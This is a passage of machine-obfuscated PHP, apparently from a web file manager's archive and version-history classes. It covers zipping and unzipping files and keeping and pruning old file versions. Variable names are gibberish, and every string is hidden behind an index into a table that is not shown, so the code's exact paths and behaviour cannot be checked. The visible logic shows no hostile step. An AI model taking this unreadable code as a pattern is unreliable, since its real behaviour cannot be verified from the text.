(count($ÕëìØ­ˆ) > 1) { $œßÎ­æï = IO::info($ã­¶µĞÔ); $Û—»èØ = $œßÎ­æï[$éß—¤şÌ[32]] . $éß—¤şÌ[10] . $÷ÕÁÂİè; } if ($¢»ÔºÎ) { $ã­¶µĞÔ = $¢»ÔºÎ; } } if ($¬ß—Ëí->getType() == $éß—¤şÌ[106]) { $éû€œÄ = self::init($ã­¶µĞÔ); $Ê·ïúÕ— = $éû€œÄ->getType() == $éß—¤şÌ[106] ? $ã­¶µĞÔ : get_path_father($¬ß—Ëí->path); $Ê·ïúÕ— = rtrim($Ê·ïúÕ—, $éß—¤şÌ[8]) . $éß—¤şÌ[8]; mk_dir($Ê·ïúÕ—); } else { $ÚÙÑ–Ï¼ = TEMP_FILES . $éß—¤şÌ[1214] . time() . rand_string(8) . $éß—¤şÌ[8]; mk_dir($ÚÙÑ–Ï¼); file_put_contents($ÚÙÑ–Ï¼ . $éß—¤şÌ[1215], $éß—¤şÌ[12]); $Ê·ïúÕ— = $ÚÙÑ–Ï¼; } $ÕşşÓ©é = IO::info($Ê·ïúÕ—); if (!$ÕşşÓ©é || !$ÕşşÓ©é[$éß—¤şÌ[216]]) { show_json(LNG($éß—¤şÌ[1216]), !1); } $™õå¥ÒÖ = self::zipFileList($ÕëìØ­ˆ, $ÚÙÑ–Ï¼); foreach ($™õå¥ÒÖ as $ÜåàØùÓ => $×¬ŠØôá) { $™õå¥ÒÖ[$ÜåàØùÓ] = self::iconvSystem($×¬ŠØôá); } $Üêçµ‹ƒ = get_filename_auto($Ê·ïúÕ— . $Û—»èØ, $éß—¤şÌ[12], $¯ˆ÷á€¨); KodArchive::create(self::iconvSystem($Üêçµ‹ƒ), $™õå¥ÒÖ); if (!IO::exist($Üêçµ‹ƒ)) { if ($ÚÙÑ–Ï¼) { del_dir($ÚÙÑ–Ï¼); } show_json(LNG($éß—¤şÌ[1217]), !1); } if (!$ÚÙÑ–Ï¼) { return $Üêçµ‹ƒ; } $¼û˜õì = self::move($Üêçµ‹ƒ, $ã­¶µĞÔ, $¯ˆ÷á€¨); if ($ÚÙÑ–Ï¼) { del_dir($ÚÙÑ–Ï¼); } if (!$Üêçµ‹ƒ) { show_json(LNG($éß—¤şÌ[1217]), !1); } return $¼û˜õì; } public static function unzip($¥¬°œå, $Ÿ¯›ášÅ, $º¼ÚÎ = "\x2d\x31", $›‰ºãà… = "\162\x65\160\154\x61\143\145") { $å¶„åá¼ =& $_SERVER[”ôÑ§ì¸]; $¼§¥’†À = parent::info($¥¬°œå); if (!$¼§¥’†À) { show_json(LNG($å¶„åá¼[1218]), !1); } $©«°Ä­Ğ = IO::infoFullSimple($Ÿ¯›ášÅ); if (!$©«°Ä­Ğ) { $Ÿ¯›ášÅ = IO::mkdir($Ÿ¯›ášÅ); } if (isset($©«°Ä­Ğ[$å¶„åá¼[180]]) && trim($©«°Ä­Ğ[$å¶„åá¼[84]], $å¶„åá¼[8]) != trim($Ÿ¯›ášÅ, $å¶„åá¼[8])) { $ï¬úöä“ = KodIO::make($©«°Ä­Ğ[$å¶„åá¼[179]]); $Óù‹ß = IO::fileNameAuto($ï¬úöä“, $©«°Ä­Ğ[$å¶„åá¼[32]], REPEAT_RENAME_FOLDER, !0); $Ÿ¯›ášÅ = IO::mkdir($ï¬úöä“ . $Óù‹ß); } $º¼ÚÎ = $º¼ÚÎ && $º¼ÚÎ != $å¶„åá¼[1219] ? @json_decode($º¼ÚÎ, !0) : -1; $€ù±Òù­ = self::unzipPart($¥¬°œå, $º¼ÚÎ); if (!$€ù±Òù­ || !IO::exist($€ù±Òù­[$å¶„åá¼[213]])) { show_json(LNG($å¶„åá¼[105]), !1); } $‘¾§‚ÓÕ = $€ù±Òù­[$å¶„åá¼[1220]][count($€ù±Òù­[$å¶„åá¼[1220]]) - 1]; if ($‘¾§‚ÓÕ[$å¶„åá¼[1221]] == -1 || substr($‘¾§‚ÓÕ[$å¶„åá¼[32]], -1, 1) == $å¶„åá¼[8]) { $ø²õë¼¯ = $€ù±Òù­[$å¶„åá¼[1222]] . rand_string(10) . $å¶„åá¼[8]; mk_dir($ø²õë¼¯); $áÕàÓÑĞ = count($€ù±Òù­[$å¶„åá¼[1220]]) == 1 ? IO::ext($¥¬°œå) : get_path_ext($€ù±Òù­[$å¶„åá¼[213]]); $ÕĞ–ŸŸ = KodArchive::extract(self::iconvSystem($€ù±Òù­[$å¶„åá¼[213]]), $ø²õë¼¯, $‘¾§‚ÓÕ[$å¶„åá¼[1221]], $Óù‹ß, $áÕàÓÑĞ); self::unzipErrorCheck($ÕĞ–ŸŸ, array($å¶„åá¼[1223], $¥¬°œå, $áÕàÓÑĞ, $Ÿ¯›ášÅ, $€ù±Òù­)); Hook::trigger($å¶„åá¼[1224], $ø²õë¼¯); recursion_dir($ø²õë¼¯, $¢’øĞÅ, $ö–‰Áî, 0); $°Ê»öé§ = array_merge($¢’øĞÅ, $ö–‰Áî); $ì®İÌ—È = array(); foreach ($°Ê»öé§ as $Æ”œé) { $±ÜôÅ®ª = IO::move(self::iconvApp($Æ”œé), $Ÿ¯›ášÅ, $›‰ºãà…); if ($±ÜôÅ®ª) { $ì®İÌ—È[] = $±ÜôÅ®ª; } } del_dir($ø²õë¼¯); } else { $±ÜôÅ®ª = IO::move($€ù±Òù­[$å¶„åá¼[213]], $Ÿ¯›ášÅ, $›‰ºãà…, get_path_this($‘¾§‚ÓÕ[$å¶„åá¼[32]])); if ($±ÜôÅ®ª) { $ì®İÌ—È[] = $±ÜôÅ®ª; } } return $ì®İÌ—È ? $ì®İÌ—È : !1; } public static function unzipList($ÎÏ…‘‚) { $à·€ÅÅÊ =& $_SERVER[”ôÑ§ì¸]; $ß®¼¯õ = isset($ÎÏ…‘‚[$à·€ÅÅÊ[1225]]) ? $ÎÏ…‘‚[$à·€ÅÅÊ[1225]] : !1; $‡”Ò­š = isset($ÎÏ…‘‚[$à·€ÅÅÊ[1221]]) ? @json_decode($ÎÏ…‘‚[$à·€ÅÅÊ[1221]], !0) : -1; $ü¦ã  = self::unzipPart($ÎÏ…‘‚[$à·€ÅÅÊ[84]], $‡”Ò­š); if (!$ü¦ã  || !IO::exist($ü¦ã [$à·€ÅÅÊ[213]])) { show_json(LNG($à·€ÅÅÊ[105]), !1); } $è®Ûş¼ï = $ü¦ã [$à·€ÅÅÊ[1220]][count($ü¦ã [$à·€ÅÅÊ[1220]]) - 1]; $ãŞßÌÁ = in_array(IO::ext($ü¦ã [$à·€ÅÅÊ[213]]), array($à·€ÅÅÊ[356], $à·€ÅÅÊ[1226], $à·€ÅÅÊ[1227], $à·€ÅÅÊ[1228], $à·€ÅÅÊ[1229], $à·€ÅÅÊ[1230])); if (!$ß®¼¯õ && ($è®Ûş¼ï[$à·€ÅÅÊ[1221]] == -1 || $ãŞßÌÁ)) { $™¥ê»İø = $ü¦ã [$à·€ÅÅÊ[1222]] . get_path_this($ü¦ã [$à·€ÅÅÊ[213]]) . $à·€ÅÅÊ[1231]; if (!IO::exist($™¥ê»İø)) { $¢©Êù« = $è®Ûş¼ï[$à·€ÅÅÊ[1221]] == -1 ? get_path_ext(IO::pathThis($ÎÏ…‘‚[$à·€ÅÅÊ[84]])) : get_path_ext($ü¦ã [$à·€ÅÅÊ[213]]); $‹–Û´¦¦ = KodArchive::listContent(self::iconvSystem($ü¦ã [$à·€ÅÅÊ[213]]), !0, $¢©Êù«); self::unzipErrorCheck($‹–Û´¦¦, array($à·€ÅÅÊ[1232], $ÎÏ…‘‚, $ü¦ã )); @file_put_contents($™¥ê»İø, json_encode($‹–Û´¦¦[$à·€ÅÅÊ[1233]])); } return @json_decode(IO::getContent($™¥ê»İø), !0); } IO::fileOut($ü¦ã [$à·€ÅÅÊ[213]], $ß®¼¯õ, get_path_this($è®Ûş¼ï[$à·€ÅÅÊ[32]])); die; } private static function zipFileList($ÓË†×æÁ, $€Œ˜’ª“ = false) { $ê„€¿ =& $_SERVER[”ôÑ§ì¸]; $ÑŠÅé†» = array(); foreach ($ÓË†×æÁ as $™¢¼ÂÔÃ) { $ºÂœßÏÈ = $™¢¼ÂÔÃ[$ê„€¿[84]]; if ($€Œ˜’ª“) { $ºÂœßÏÈ = self::copy($™¢¼ÂÔÃ[$ê„€¿[84]], $€Œ˜’ª“, $ê„€¿[840]); } else { $ß€Ï’ªò = self::init($™¢¼ÂÔÃ[$ê„€¿[84]]); if ($ß€Ï’ªò->getType() == $ê„€¿[106]) { $ºÂœßÏÈ = $ß€Ï’ªò->path; } } if ($ºÂœßÏÈ && self::local()->exist($ºÂœßÏÈ)) { $ÑŠÅé†»[$™¢¼ÂÔÃ[$ê„€¿[84]]] = $ºÂœßÏÈ; } } if (!empty($ÑŠÅé†»)) { return array_values($ÑŠÅé†»); } show_json(LNG($ê„€¿[1196]), !1); } private static function localFilePath($ÍÍĞš) { $Â†îøõ— =& $_SERVER[”ôÑ§ì¸]; $ƒ‹–İ¹ = KodIO::parse($ÍÍĞš); if ($ƒ‹–İ¹[$Â†îøõ—[33]] == KodIO::KOD_SOURCE) { $ÛßÇ…¥î = Model($Â†îøõ—[847])->fileInfoGet(KodIO::sourceID($ÍÍĞš)); if (!$ÛßÇ…¥î[$Â†îøõ—[84]]) { show_json($Â†îøõ—[1234], !1); } $ÍÍĞš = $ÛßÇ…¥î[$Â†îøõ—[84]]; } $Ó¸Äúå¡ = self::init($ÍÍĞš); if ($Ó¸Äúå¡->pathParse[$Â†îøõ—[1182]]) { $ÍÍĞš = $Ó¸Äúå¡->pathParse[$Â†îøõ—[1182]]; $Ó¸Äúå¡ = self::init($ÍÍĞš); } $İÉÉ‚Ù  = $Ó¸Äúå¡->getType(); if ($İÉÉ‚Ù  == $Â†îøõ—[106] || $İÉÉ‚Ù  == $Â†îøõ—[1235]) { if (!$Ó¸Äúå¡->exist($Ó¸Äúå¡->path)) { show_json(LNG($Â†îøõ—[105]), !1); } return $Ó¸Äúå¡->path; } return !1; } public static function unzipPart($ù­‘Õ‘î, $Î«íıè = -1) { $ùîà…„Ú =& $_SERVER[”ôÑ§ì¸]; $–ûÊÁ€Ë = IO::pathThis($ù­‘Õ‘î); if (!$Î«íıè || $Î«íıè == -1) { $„ª˜ÉĞÖ = array(array($ùîà…„Ú[32] => $–ûÊÁ€Ë, $ùîà…„Ú[1221] => -1)); $„ª˜ÉĞÖ[0][$ùîà…„Ú[1236]] = $„ª˜ÉĞÖ[0][$ùîà…„Ú[32]]; } else { if (is_array($Î«íıè)) { $„ª˜ÉĞÖ = $Î«íıè; $«Õğ¼× = count($„ª˜ÉĞÖ) - 1; for ($¨Ê¡åİ¢ = 0; $¨Ê¡åİ¢ <= $«Õğ¼×; $¨Ê¡åİ¢++) { $äÎ…É¾ı = $„ª˜ÉĞÖ[$¨Ê¡åİ¢]; $÷Ùë·“è = get_path_this($äÎ…É¾ı[$ùîà…„Ú[32]]) . (checkExtSafe($äÎ…É¾ı[$ùîà…„Ú[32]]) ? $ùîà…„Ú[12] : $ùîà…„Ú[1237]); $„ª˜ÉĞÖ[$¨Ê¡åİ¢][$ùîà…„Ú[1236]] = $ùîà…„Ú[1238] . intval($äÎ…É¾ı[$ùîà…„Ú[1221]]) . $ùîà…„Ú[429] . $÷Ùë·“è; if ($¨Ê¡åİ¢ == 0) { continue; } $„ª˜ÉĞÖ[$¨Ê¡åİ¢][$ùîà…„Ú[1236]] = $„ª˜ÉĞÖ[$¨Ê¡åİ¢ - 1][$ùîà…„Ú[1236]] . $ùîà…„Ú[1239] . $„ª˜ÉĞÖ[$¨Ê¡åİ¢][$ùîà…„Ú[1236]]; } } } if (!is_array($„ª˜ÉĞÖ) || count($„ª˜ÉĞÖ) == 0) { return !1; } $°ÄµØŞò = $„ª˜ÉĞÖ[count($„ª˜ÉĞÖ) - 1]; if (!IO::exist($ù­‘Õ‘î)) { return !1; } $óˆü¸»Ç = TEMP_FILES . $ùîà…„Ú[1240] . kodIO::hashPathSafe($ù­‘Õ‘î) . $ùîà…„Ú[8]; $²Šğ¯ÑÁ = $óˆü¸»Ç . $°ÄµØŞò[$ùîà…„Ú[1236]]; mk_dir($óˆü¸»Ç); file_put_contents(TEMP_FILES . $ùîà…„Ú[1215], $ùîà…„Ú[12]); if (IO::exist($²Šğ¯ÑÁ)) { return array($ùîà…„Ú[213] => $²Šğ¯ÑÁ, $ùîà…„Ú[1220] => $„ª˜ÉĞÖ, $ùîà…„Ú[1222] => $óˆü¸»Ç); } $·—¬ø’ª = self::localFilePath($ù­‘Õ‘î); if (!$·—¬ø’ª) { $·—¬ø’ª = $óˆü¸»Ç . $ùîà…„Ú[1241]; if (!IO::exist($·—¬ø’ª)) { self::copy($ù­‘Õ‘î, $óˆü¸»Ç, !1, get_path_this($·—¬ø’ª)); } } if (!$·—¬ø’ª || !IO::exist($·—¬ø’ª)) { return !1; } if ($°ÄµØŞò[$ùîà…„Ú[1221]] == -1) { return array($ùîà…„Ú[213] => $·—¬ø’ª, $ùîà…„Ú[1220] => $„ª˜ÉĞÖ, $ùîà…„Ú[1222] => $óˆü¸»Ç); } $ ëîş—è = $·—¬ø’ª; foreach ($„ª˜ÉĞÖ as $¨Ê¡åİ¢ => $äÎ…É¾ı) { if (!$äÎ…É¾ı || $äÎ…É¾ı[$ùîà…„Ú[1221]] == $ùîà…„Ú[1219]) { break; } if (substr($äÎ…É¾ı[$ùîà…„Ú[32]], -1, 1) == $ùîà…„Ú[8]) { break; } $§§ò‚Ç = in_array(get_path_ext($äÎ…É¾ı[$ùîà…„Ú[1236]]), array($ùîà…„Ú[356], $ùîà…„Ú[1226], $ùîà…„Ú[1227], $ùîà…„Ú[1228], $ùîà…„Ú[1229], $ùîà…„Ú[1230])); $´§™ˆò  = $¨Ê¡åİ¢ == count($„ª˜ÉĞÖ) - 1 && $§§ò‚Ç; $ïšåı«µ = $óˆü¸»Ç . $äÎ…É¾ı[$ùîà…„Ú[1236]]; $à¸Æòõë = $óˆü¸»Ç . get_path_this($äÎ…É¾ı[$ùîà…„Ú[32]]); if (IO::exist($ïšåı«µ)) { $ ëîş—è = $ïšåı«µ; continue; } $ªú¶Â›Ï = $¨Ê¡åİ¢ == 0 ? get_path_ext($–ûÊÁ€Ë) : get_path_ext($ ëîş—è); $Â™«£Ûš = KodArchive::extract(self::iconvSystem($ ëîş—è), $óˆü¸»Ç, $äÎ…É¾ı[$ùîà…„Ú[1221]], $£´‰¾òÀ, $ªú¶Â›Ï); self::unzipErrorCheck($Â™«£Ûš, array($ùîà…„Ú[1242], $ù­‘Õ‘î, $„ª˜ÉĞÖ, $äÎ…É¾ı, $ïšåı«µ)); if (IO::exist($à¸Æòõë)) { IO::rename($à¸Æòõë, get_path_this($ïšåı«µ)); } $ ëîş—è = $ïšåı«µ; } $²Šğ¯ÑÁ = $ ëîş—è; return array($ùîà…„Ú[213] => $ ëîş—è, $ùîà…„Ú[1220] => $„ª˜ÉĞÖ, $ùîà…„Ú[1222] => $óˆü¸»Ç); } private static function unzipErrorCheck($ğÖÉ­‡ñ, $À€äöŞ¼ = false) { $‚µ”ŒĞó =& $_SERVER[”ôÑ§ì¸]; if ($ğÖÉ­‡ñ[$‚µ”ŒĞó[1243]]) { return !0; } write_log(array($‚µ”ŒĞó[1244], $ğÖÉ­‡ñ, $À€äöŞ¼), $‚µ”ŒĞó[1245]); show_json($‚µ”ŒĞó[1246] . json_encode($ğÖÉ­‡ñ[$‚µ”ŒĞó[1233]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $£à‘…ÂÜ =& $_SERVER[”ôÑ§ì¸]; $ûî«¬« = $GLOBALS[$£à‘…ÂÜ[6]][$£à‘…ÂÜ[89]]; if ($ûî«¬«[$£à‘…ÂÜ[1247]] != 1) { return; } if ($ûî«¬«[$£à‘…ÂÜ[1248]] <= 0) { return; } if (isset($_REQUEST[$£à‘…ÂÜ[1249]]) && $_REQUEST[$£à‘…ÂÜ[1249]] == $£à‘…ÂÜ[88]) { return; } Hook::bind($£à‘…ÂÜ[1250], $£à‘…ÂÜ[1251]); Hook::bind($£à‘…ÂÜ[1252], $£à‘…ÂÜ[1253]); Hook::bind($£à‘…ÂÜ[1254], $£à‘…ÂÜ[1255]); Hook::bind($£à‘…ÂÜ[1256], $£à‘…ÂÜ[1257]); Hook::bind($£à‘…ÂÜ[1258], $£à‘…ÂÜ[1259]); Hook::bind($£à‘…ÂÜ[1260], $£à‘…ÂÜ[1261]); } public static function eventBeforeUpload($àø™Ï) { if ($àø™Ï[3] && $àø™Ï[3] != REPEAT_REPLACE) { return; } $Ñ®¡Ö°‹ = self::parsePath($àø™Ï[0]); if (!$Ñ®¡Ö°‹) { return; } self::add($Ñ®¡Ö°‹); } public static function eventBeforeEdit($ÂÛ²¦‚½) { $à¸İöÚ¤ = self::parsePath($ÂÛ²¦‚½[0]); if (!$à¸İöÚ¤) { return; } self::add($à¸İöÚ¤); } public static function eventBeforeCopyFile($·ìâóò, $˜á×ìš£, $ú›œè×ñ, $Í³ìú´, $•Ü€³Ğê, $†³ Şìæ) { $õá¤°¤› =& $_SERVER[”ôÑ§ì¸]; if (isset($ú›œè×ñ->_data[$õá¤°¤›[1186]]) && $ú›œè×ñ->_data[$õá¤°¤›[1186]]) { return; } $óš×”™ê = $ú›œè×ñ->getPathOuter($Í³ìú´); $õ•ñø¥‰ = self::parsePath($óš×”™ê); if (!$õ•ñø¥‰) { return; } self::add($õ•ñø¥‰); } public static function eventBeforeRename($æªÀëú) { $¸¾É‚ï‰ =& $_SERVER[”ôÑ§ì¸]; $•õ‘‘à’ = self::parsePath($æªÀëú[0]); if (!$•õ‘‘à’) { return; } $çŸÖàÏ¬ = self::checkInHistory($•õ‘‘à’); if (!$çŸÖàÏ¬) { return; } if ($çŸÖàÏ¬[$¸¾É‚ï‰[33]] == $¸¾É‚ï‰[213]) { $Á©ÍÙ™Œ = self::listData($•õ‘‘à’); if ($Á©ÍÙ™Œ && $Á©ÍÙ™Œ[$¸¾É‚ï‰[412]]) { self::moveHistory($•õ‘‘à’, $æªÀëú[1]); } } else { IO::rename($çŸÖàÏ¬[$¸¾É‚ï‰[84]], $æªÀëú[1]); } } public static function eventBeforeMove($ÑÆ…´æÂ) { $à“ñ¥êÛ =& $_SERVER[”ôÑ§ì¸]; $Áª‹„­ã = self::parsePath($ÑÆ…´æÂ[0]); if (!$Áª‹„­ã) { return; } $µ‰ĞŠ‚Ç = self::parsePath($ÑÆ…´æÂ[1]); if (!$µ‰ĞŠ‚Ç) { return; } $’À™ü²Å = $ÑÆ…´æÂ[3]; $ã®ÏŒÌ€ = self::checkInHistory($Áª‹„­ã); if (!$ã®ÏŒÌ€) { return; } $áÔæÉÍÄ = self::pathHistory($µ‰ĞŠ‚Ç); if ($ã®ÏŒÌ€[$à“ñ¥êÛ[33]] == $à“ñ¥êÛ[213]) { $àíâ½ò´ = self::listData($Áª‹„­ã); $ßøÙ«¥Á = rtrim($µ‰ĞŠ‚Ç, $à“ñ¥êÛ[8]) . $à“ñ¥êÛ[8] . ($’À™ü²Å ? $’À™ü²Å : get_path_this($Áª‹„­ã)); $ü˜ó‡á = self::listData($ßøÙ«¥Á); if ($àíâ½ò´ && $àíâ½ò´[$à“ñ¥êÛ[412]] && $ü˜ó‡á && $ü˜ó‡á[$à“ñ¥êÛ[412]]) { return self::clear($Áª‹„­ã); } if ($àíâ½ò´ && $àíâ½ò´[$à“ñ¥êÛ[412]]) { self::moveHistory($Áª‹„­ã, $’À™ü²Å, $áÔæÉÍÄ); } } else { IO::move($ã®ÏŒÌ€[$à“ñ¥êÛ[84]], $áÔæÉÍÄ, !1, $’À™ü²Å); self::clearEmptyFolder(IO::pathFather($ã®ÏŒÌ€[$à“ñ¥êÛ[84]])); } } public static function eventAfterRemove($¼£¾…²›, $ÓûÈ‹) { $‡ÃÈ„†Œ =& $_SERVER[”ôÑ§ì¸]; if (!$ÓûÈ‹) { return; } $¤–‰Ş¨ä = self::parsePath($¼£¾…²›[0]); if (!$¤–‰Ş¨ä) { return; } $† Ÿ’¾â = self::checkInHistory($¤–‰Ş¨ä); if (!$† Ÿ’¾â) { return; } if ($† Ÿ’¾â[$‡ÃÈ„†Œ[33]] == $‡ÃÈ„†Œ[213]) { $Ã¼×İ‘“ = self::listData($¤–‰Ş¨ä, !1); if ($Ã¼×İ‘“ && $Ã¼×İ‘“[$‡ÃÈ„†Œ[412]]) { self::clear($¤–‰Ş¨ä, !1); } } else { IO::remove($† Ÿ’¾â[$‡ÃÈ„†Œ[84]]); self::clearEmptyFolder(IO::pathFather($† Ÿ’¾â[$‡ÃÈ„†Œ[84]])); } } private static function checkInHistory($‘‹‰ûÏ…) { $˜ƒòèÇğ = self::pathHistory($‘‹‰ûÏ…); if (!IO::exist($˜ƒòèÇğ)) { $˜ƒòèÇğ .= $_SERVER[”ôÑ§ì¸][1262]; } return IO::exist($˜ƒòèÇğ) ? IO::info($˜ƒòèÇğ) : !1; } private static function parsePath($…´ËîÔÄ) { $¸Ç¨ä»“ =& $_SERVER[”ôÑ§ì¸]; if (!$…´ËîÔÄ) { return !1; } if ($GLOBALS[$¸Ç¨ä»“[1263]]) { return; } $¢†ÌÛ…ï = KodIO::parse($…´ËîÔÄ); $Úœ³ª¹¹ = $¢†ÌÛ…ï[$¸Ç¨ä»“[33]]; $Ÿ–ã„· = !$Úœ³ª¹¹ || $Úœ³ª¹¹ == KodIO::KOD_IO || $Úœ³ª¹¹ == KodIO::KOD_SHARE_ITEM; if (!$Ÿ–ã„· || !$¢†ÌÛ…ï[$¸Ç¨ä»“[1264]]) { return !1; } if (substr($…´ËîÔÄ, 0, strlen(DATA_PATH . $¸Ç¨ä»“[1265])) == DATA_PATH . $¸Ç¨ä»“[1265]) { return !1; } if ($Úœ³ª¹¹ == KodIO::KOD_SHARE_ITEM) { $…‘ğ·Œµ = IO::init($…´ËîÔÄ); if ($…‘ğ·Œµ->pathParse[$¸Ç¨ä»“[1182]]) { return self::parsePath($…‘ğ·Œµ->pathParse[$¸Ç¨ä»“[1182]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Ÿãóâ‚Ÿ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¸Ç¨ä»“[1266]); foreach ($Ÿãóâ‚Ÿ as $„éÇì¯¥) { if (!$Úœ³ª¹¹ && substr($…´ËîÔÄ, 0, strlen($„éÇì¯¥)) == $„éÇì¯¥) { return !1; } } self::log($GLOBALS[$¸Ç¨ä»“[1177]] . $¸Ç¨ä»“[1267] . $…´ËîÔÄ); return $…´ËîÔÄ; } private static function pathHistory($‘Ì’Æ¥í) { $Ô»¨İ— =& $_SERVER[”ôÑ§ì¸]; $¼´î±òÜ = self::$_historyBase . ltrim(KodIO::clear($‘Ì’Æ¥í), $Ô»¨İ—[8]); $¼´î±òÜ = str_replace(array($Ô»¨İ—[1268]), array($Ô»¨İ—[1269]), $¼´î±òÜ); return $¼´î±òÜ; } public static function log($‘¡ó…‚Î) { } public static function historyCount($°ù‘ğˆ”) { $°á‹©ß =& $_SERVER[”ôÑ§ì¸]; $ÛÓ„Ä©« = array(); $ğ¸å°…¦ = array(); foreach ($°ù‘ğˆ” as $ñ§õåõè) { $ÊğÀÆÖ = get_path_father($ñ§õåõè); if (!$ğ¸å°…¦[$ÊğÀÆÖ]) { $ğ¸å°…¦[$ÊğÀÆÖ] = array(); } $ğ¸å°…¦[$ÊğÀÆÖ][] = get_path_this($ñ§õåõè); } foreach ($ğ¸å°…¦ as $ÊğÀÆÖ => $Òí¨…óÏ) { $”Àù³È³ = self::parsePath($ÊğÀÆÖ); if (!$”Àù³È³) { continue; } foreach ($Òí¨…óÏ as $õÏö©Óû) { $×…Â®‚ = self::listData(rtrim($”Àù³È³, $°á‹©ß[8]) . $°á‹©ß[8] . $õÏö©Óû, !1); if ($×…Â®‚ && $×…Â®‚[$°á‹©ß[412]]) { $ÛÓ„Ä©«[rtrim($ÊğÀÆÖ, $°á‹©ß[8]) . $°á‹©ß[8] . $õÏö©Óû] = count($×…Â®‚[$°á‹©ß[412]]); } } } return $ÛÓ„Ä©«; } public static function add($íŸ¤ÒÃî) { $¦ì¥’·˜ =& $_SERVER[”ôÑ§ì¸]; $¥ßÏÀ¸ = self::listData($íŸ¤ÒÃî); if (!$¥ßÏÀ¸) { return; } $¹ÅåÇ¬ = Model($¦ì¥’·˜[792])->get($¦ì¥’·˜[1270]); $ôó­şşÜ = $GLOBALS[$¦ì¥’·˜[6]][$¦ì¥’·˜[89]][$¦ì¥’·˜[1248]]; $Á“ùŒ¢ğ = $¹ÅåÇ¬ == $¦ì¥’·˜[1271] ? min(5, $ôó­şşÜ) : $ôó­şşÜ; if ($ôó­şşÜ <= 0) { return; } $Şì“°ìÏ = IO::info($íŸ¤ÒÃî); $îôô¦ù¾ = $¥ßÏÀ¸[$¦ì¥’·˜[412]]; if ($Şì“°ìÏ[$¦ì¥’·˜[76]] == 0) { return; } if ($Şì“°ìÏ[$¦ì¥’·˜[76]] >= 1024 * 1024 * 500) { return !1; } $ÁÒÔî© = IO::hashSimple($íŸ¤ÒÃî); if ($îôô¦ù¾ && $îôô¦ù¾[0][$¦ì¥’·˜[639]] == $ÁÒÔî©) { return !0; } if (array_key_exists($¦ì¥’·˜[216], $Şì“°ìÏ) && !$Şì“°ìÏ[$¦ì¥’·˜[216]]) { return !1; } $á†—”’  = short_id(time()); $â’ûÊ·Œ = array($¦ì¥’·˜[442] => $á†—”’ , $¦ì¥’·˜[639] => $ÁÒÔî©, $¦ì¥’·˜[32] => $Şì“°ìÏ[$¦ì¥’·˜[32]] . $¦ì¥’·˜[10] . date($¦ì¥’·˜[1272]) . rand_string(1), $¦ì¥’·˜[76] => $Şì“°ìÏ[$¦ì¥’·˜[76]], $¦ì¥’·˜[494] => USER_ID, $¦ì¥’·˜[214] => time(), $¦ì¥’·˜[1273] => $¦ì¥’·˜[12]); IO::mkdir($¥ßÏÀ¸[$¦ì¥’·˜[1274]]); $ğ‡¶»½Š = IO::copy($íŸ¤ÒÃî, $¥ßÏÀ¸[$¦ì¥’·˜[1274]], !1, $â’ûÊ·Œ[$¦ì¥’·˜[32]]); if (!$ğ‡¶»½Š) { self::clearEmptyFolder($¥ßÏÀ¸[$¦ì¥’·˜[1274]]); return !1; } array_unshift($îôô¦ù¾, $â’ûÊ·Œ); if (count($îôô¦ù¾) > $Á“ùŒ¢ğ) { $øÕˆ¶Í = array_slice($îôô¦ù¾, $Á“ùŒ¢ğ); foreach ($øÕˆ¶Í as $ß±­¹ÇÉ) { IO::remove($¥ßÏÀ¸[$¦ì¥’·˜[1274]] . $ß±­¹ÇÉ[$¦ì¥’·˜[32]]); } $îôô¦ù¾ = array_slice($îôô¦ù¾, 0, $Á“ùŒ¢ğ); } return self::saveData($¥ßÏÀ¸[$¦ì¥’·˜[1275]], $îôô¦ù¾); } public static function remove($íÛĞ×Ò, $œ¡¹¹÷±) { $Ó•¦Èå =& $_SERVER[”ôÑ§ì¸]; $÷„³ãŒ = self::listData($íÛĞ×Ò); $ÓÁ¸–­‘ = array(); if (!$÷„³ãŒ) { return !1; } foreach ($÷„³ãŒ[$Ó•¦Èå[412]] as $÷ƒÔ·ü) { if ($÷ƒÔ·ü[$Ó•¦Èå[442]] == $œ¡¹¹÷±) { IO::remove($÷„³ãŒ[$Ó•¦Èå[1274]] . $÷ƒÔ·ü[$Ó•¦Èå[32]]); continue; } $ÓÁ¸–­‘[] = $÷ƒÔ·ü; } return self::saveData($÷„³ãŒ[$Ó•¦Èå[1275]], $ÓÁ¸–­‘); } public static function clear($şÂÍ Äğ, $Ä„ùâ«Å = true) { $»¼ñï÷Ğ =& $_SERVER[”ôÑ§ì¸]; $Ü¨òÏ»˜ = self::listData($şÂÍ Äğ, $Ä„ùâ«Å); if (!$Ü¨òÏ»˜) { return !1; } foreach ($Ü¨òÏ»˜[$»¼ñï÷Ğ[412]] as $ØÖ“‰ı¶) { IO::remove($Ü¨òÏ»˜[$»¼ñï÷Ğ[1274]] . $ØÖ“‰ı¶[$»¼ñï÷Ğ[32]]); } return self::saveData($Ü¨òÏ»˜[$»¼ñï÷Ğ[1275]], array()); } public static function moveHistory($İœÍÃóö, $ğ£ˆˆ¤ø = '', $›æÅÇÚÄ = '') { $ıĞüœÂ =& $_SERVER[”ôÑ§ì¸]; $é‡‚üšû = self::listData($İœÍÃóö, !1); if (!$é‡‚üšû || !$é‡‚üšû[$ıĞüœÂ[412]]) { return !1; } $€äèæÇ‡ = $ıĞüœÂ[1262]; $ğ£ˆˆ¤ø = $ğ£ˆˆ¤ø ? $ğ£ˆˆ¤ø : get_path_this($İœÍÃóö); $›æÅÇÚÄ = $›æÅÇÚÄ ? $›æÅÇÚÄ : $é‡‚üšû[$ıĞüœÂ[1274]]; $„—ıâòå = substr(get_path_this($é‡‚üšû[$ıĞüœÂ[1275]]), 0, -strlen($€äèæÇ‡)); foreach ($é‡‚üšû[$ıĞüœÂ[412]] as $´óåƒÀğ => $ŒÔ‚¦´æ) { $Öı™½é² = $ğ£ˆˆ¤ø . substr($ŒÔ‚¦´æ[$ıĞüœÂ[32]], strlen($„—ıâòå)); $†¡Èãà‡ = IO::move($é‡‚üšû[$ıĞüœÂ[1274]] . $ŒÔ‚¦´æ[$ıĞüœÂ[32]], $›æÅÇÚÄ, !1, $Öı™½é²); if ($†¡Èãà‡) { $é‡‚üšû[$ıĞüœÂ[412]][$´óåƒÀğ][$ıĞüœÂ[32]] = $Öı™½é²; } } $é‡‚üšû[$ıĞüœÂ[1275]] = IO::move($é‡‚üšû[$ıĞüœÂ[1275]], $›æÅÇÚÄ, !1, $ğ£ˆˆ¤ø . $€äèæÇ‡); 